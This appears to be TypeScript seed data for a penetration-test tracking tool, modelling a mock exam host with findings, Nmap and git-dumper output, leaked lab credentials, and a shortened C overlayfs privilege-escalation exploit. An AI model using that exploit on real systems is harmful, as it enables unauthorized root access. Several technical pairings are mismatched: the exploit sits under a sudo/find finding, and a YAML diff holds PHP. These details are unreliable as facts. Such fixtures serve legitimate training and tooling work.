      refs: ["https://www.jenkins.io/doc/book/managing/script-console/", "https://gtfobins.github.io/gtfobins/find/"],
    }),
    finding("zip", {
      title: "Weak backup password", severity: "medium",
      description: "`/opt/backup/site-backup.zip` is readable by `ronan` and protected by the rockyou password `sunflower7`. It holds Joomla's `configuration.php` with the database password `Garnet#Db26`.",
      remediation: "Protect backups with a long random password and keep them out of users' reach.",
    }),
    finding("installer", {
      title: "Joomla installer left in place", severity: "low",
      description: "`/cms/installation/sql/` is world-readable and holds a planted LDAP bind credential, `admin` / `opal42`.",
      remediation: "Delete the `installation/` folder after setup.",
    }),
    finding("php-source", {
      title: "PHP source disclosure", severity: "low",
      description: "`/cms/index.php` is served as plain text instead of being executed:\n\n    <?php\n    define('_JEXEC', 1);\n    require_once __DIR__ . '/includes/app.php';",
      remediation: "Enable the PHP handler for `/cms/`.",
    }),
  ];
  const findingFiles: FindingFile[] = [
    {
      id: "ff-garnet-ovl", findingId: "f-garnet-sudo-find", name: "exp.c", language: "c", content: OVL_EXP, modified: false,
      originalUrl: "https://gtfobins.github.io/gtfobins/find/", originalContent: OVL_EXP, createdAt: ago(200), updatedAt: ago(200),
    },
  ];
  const attempts: FailedAttempt[] = [
    {
      id: "fa-garnet-ftp", engagementId: E, hostId: H, findingId: null, private: false, logEntryId: ftp, title: "Anonymous FTP login on 21/tcp",
      reasonKind: "control", reason: "Anonymous login is refused (530 Login incorrect).", createdAt: ago(296), updatedAt: ago(296),
    },
    {
      id: "fa-garnet-x86", engagementId: E, hostId: H, findingId: null, private: true, logEntryId: x86, title: "Ran ./exp from my home folder",
      reasonKind: "operator", reason: "Wrong working directory.", createdAt: ago(262), updatedAt: ago(262),
    },
  ];
  const usernames: Username[] = [
    { id: "u-garnet-ronan", engagementId: E, username: "ronan", domain: null, sourceHostId: H, source: "git history", createdAt: ago(286), scope: "unknown", localHostId: null },
    { id: "u-garnet-root", engagementId: E, username: "root", domain: null, sourceHostId: H, source: null, createdAt: ago(248), scope: "unknown", localHostId: null },
  ];
  const grants: AccessGrant[] = [
    { id: "ag-garnet-user", engagementId: E, usernameId: "u-garnet-ronan", hostId: H, level: "user", via: "SSH with the password from git history", logEntryId: ssh, at: ago(277) },
    { id: "ag-garnet-root", engagementId: E, usernameId: "u-garnet-root", hostId: H, level: "system", via: "sudo CVE-2021-3156", logEntryId: exp, at: ago(248) },
  ];
  const checklist: ChecklistItem[] = [
    { ownerId: H, goalId: "h-enum-full-tcp", status: "done", notes: null, completedAt: ago(300), auto: true, autoFrom: null, statusManual: false, evidence: [{ entryId: nmap }], updatedAt: ago(300) },
  ];
  const host: Host = {
    id: H, engagementId: E, name: "garnet", ip: "10.10.30.31", os: "linux", boardColumn: "post-exploitation", boardManual: false, access: "root",
    createdAt: ago(310), updatedAt: ago(245), dualHomed: false, boardDerived: null, accessReviewedAt: null, adSet: null, adSetEffective: false,
  };
  const engagement: Engagement = {
    id: E, name: "Mock exam 2", kind: "exam-sim", client: null, subLabel: "Set B", scopeCidrs: ["10.10.30.0/24"], domain: "exam.corp", startsAt: null,
    endsAt: null, timeboxStart: ago(320), timeboxMinutes: 1425, status: "active", createdAt: ago(320), updatedAt: ago(245), lastActivityAt: ago(245),
    lastRanOn: "Kali (VM)", msfHostId: null, timeboxPausedMs: 0, timeboxPausedAt: null,
  };
  return {
    engagement, hosts: [host], services, log, checklist, findings, findingFiles, attempts, ruledOut: [], grants, usernames, hops: [], cleanup: [], notes: [],
    credentials: [], credAttempts: [],
  };
}

const GARNET_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-09 16:02 UTC
Nmap scan report for 10.10.30.31
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a3:5c:9e:41:7b:20:d8:6f:c1:94:2e:b7:0d:58:13:6a (ECDSA)
|_  256 0f:62:d4:8b:93:1a:57:e0:c2:7d:44:b8:a9:15:3e:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Garnet Jewellers
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-git:
|   10.10.30.31:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Add the reporting datasource
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.87 seconds`;

/** git-dumper's progress: long enough that the page cuts it. */
const GIT_DUMPER = [
  "[-] Testing http://10.10.30.31/.git/HEAD [200]",
  "[-] Testing http://10.10.30.31/.git/ [403]",
  "[-] Fetching common files",
  ...[
    ".gitignore", ".git/COMMIT_EDITMSG", ".git/description", ".git/hooks/applypatch-msg.sample", ".git/hooks/commit-msg.sample",
    ".git/hooks/post-update.sample", ".git/hooks/pre-applypatch.sample", ".git/hooks/pre-commit.sample", ".git/hooks/pre-push.sample",
    ".git/hooks/pre-rebase.sample", ".git/hooks/prepare-commit-msg.sample", ".git/hooks/update.sample", ".git/index", ".git/info/exclude",
    ".git/logs/HEAD", ".git/logs/refs/heads/main", ".git/refs/heads/main", ".git/packed-refs",
  ].map((f) => `[-] Fetching http://10.10.30.31/${f} [200]`),
  "[-] Finding refs/",
  "[-] Finding packs",
  "[-] Finding objects",
  "[-] Fetching objects",
  ...[
    "3b9e0c4f1a2d8e7b6c5a4f3e2d1c0b9a8f7e6d5c", "91d2f7a0b3c4d5e6f708192a3b4c5d6e7f8091a2", "5ac01be7d6c5b4a3928170f6e5d4c3b2a1908f7e",
    "0e4f6a8c1d3b5e7f9a0c2e4f6a8b0d2f4a6c8e0b", "1f3a5c7e9b0d2f4a6c8e0a2c4e6f8b0d2e4a6c8f", "2a4c6e8f0b2d4f6a8c0e2a4c6e8f0b2d4f6a8c0e",
    "3b5d7f9a1c3e5f7b9d1f3b5d7f9a1c3e5f7b9d1f", "4c6e8a0b2d4f6b8d0f2c4e6a8b0d2f4b6d8f0a2c", "5d7f9b1c3e5a7c9e1a3d5f7b9c1e3a5c7e9a1b3d",
    "6e8a0c2d4f6b8d0a2c4e6b8d0f2a4c6e8b0d2f4e", "7f9b1d3e5a7c9e1b3d5f7c9e1a3b5d7f9c1e3a5f", "8a0c2e4f6b8d0a2c4e6f8b0d2a4c6e8f0b2d4f6a",
    "9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5f7b", "a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8", "b1d3f5c7e9a1b3d5f7c9e1a3b5d7f9c1e3a5b7d9",
    "c2e4a6d8f0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0", "d3f5b7e9a1c3e5f7b9d1f3c5e7a9b1d3f5c7e9a1", "e4a6c8f0b2d4f6a8c0e2a4d6f8b0c2e4a6d8f0b2",
    "f5b7d9a1c3e5f7b9d1f3b5e7a9c1d3f5b7e9a1c3", "06c8e0b2d4f6a8c0e2a4c6f8b0d2e4a6c8f0b2d4", "17d9f1c3e5a7b9d1f3b5d7a9c1e3f5b7d9a1c3e5",
    "28e0a2d4f6b8c0e2a4c6e8b0d2f4a6c8e0b2d4f6", "39f1b3e5a7c9d1f3b5d7f9c1e3a5b7d9f1c3e5a7", "4a02c4f6b8d0e2a4c6e8a0d2f4b6c8e0a2d4f6b8",
    "5b13d5a7c9e1f3b5d7f9b1e3a5c7d9f1b3e5a7c9", "6c24e6b8d0f2a4c6e8a0c2f4b6d8e0a2c4f6b8d0", "7d35f7c9e1a3b5d7f9b1d3a5c7e9f1b3d5a7c9e1",
    "8e46a8d0f2b4c6e8a0c2e4b6d8f0a2c4e6b8d0f2", "9f57b9e1a3c5d7f9b1d3f5c7e9a1b3d5f7c9e1a3", "a068c0f2b4d6e8a0c2e4a6d8f0b2c4e6a8d0f2b4",
    "b179d1a3c5e7f9b1d3f5b7e9a1c3d5f7b9e1a3c5", "c28ae2b4d6f8a0c2e4a6c8f0b2d4e6a8c0f2b4d6", "d39bf3c5e7a9b1d3f5b7d9a1c3e5f7b9d1a3c5e7",
    "e4acf4d6f8b0c2e4a6c8e0b2d4f6a8c0e2b4d6f8", "f5bd05e7a9c1d3f5b7d9f1c3e5a7b9d1f3c5e7a9", "06ce16f8b0d2e4a6c8e0a2d4f6b8c0e2a4d6f8b0",
    "17df27a9c1e3f5b7d9f1b3e5a7c9d1f3b5e7a9c1", "28e038b0d2f4a6c8e0a2c4f6b8d0e2a4c6f8b0d2", "39f149c1e3a5b7d9f1b3d5a7c9e1f3b5d7a9c1e3",
    "4a025ad2f4b6c8e0a2c4e6b8d0f2a4c6e8b0d2f4", "5b136be3a5c7d9f1b3d5f7c9e1a3b5d7f9c1e3a5", "6c247cf4b6d8e0a2c4e6a8d0f2b4c6e8a0d2f4b6",
    "7d358d05c7e9f1b3d5f7b9e1a3c5d7f9b1e3a5c7", "8e469e16d8f0a2c4e6a8c0f2b4d6e8a0c2f4b6d8",
  ].map((h) => `[-] Fetching http://10.10.30.31/.git/objects/${h.slice(0, 2)}/${h.slice(2)} [200]`),
  "[-] Running git checkout .",
  "Updated 41 paths from the index",
].join("\n");

const GIT_SHOW = `commit 3b9e0c4f1a2d8e7b6c5a4f3e2d1c0b9a8f7e6d5c
Author: garnet-dev <dev@garnet.lab>
Date:   Tue Oct 14 10:22:48 2025 +0100

    Add the reporting datasource

diff --git a/datasources/mysql.yaml b/datasources/mysql.yaml
index 7a1c2e4..0d9b3f6 100644
--- a/datasources/mysql.yaml
+++ b/datasources/mysql.yaml
@@ -2,8 +2,8 @@
 class Database {
     private $host = "localhost";
     private $db_name = "garnet";
-    private $username = "ronan@garnet.lab";
-    private $password = "Tourmaline!77";
+    private $username = "";
+    private $password = "";
     public $conn;
 
     public function getConnection() {`;

/** The public exploit's trigger, as the repository ships it (shortened). */
const OVL_EXP = `#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>
#include <unistd.h>

int main(int argc, char **argv) {
    printf("uid:%d gid:%d\\n", getuid(), getgid());
    /* unshare into a user and mount namespace, mount overlay over the FUSE lower dir, touch the file to copy it up */
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) { perror("unshare"); exit(1); }
    if (mount("tmpfs", "./workdir/merge", "tmpfs", 0, "lowerdir=./workdir/lower,upperdir=./workdir/upper,workdir=./workdir/work") == -1) {
        perror("mount"); exit(1);
    }
    puts("[+] mount success");
    system("ls -la ./workdir/upper");
    puts("[+] exploit success!");
    execl("./workdir/upper/file", "file", NULL);
    return 0;
}`;
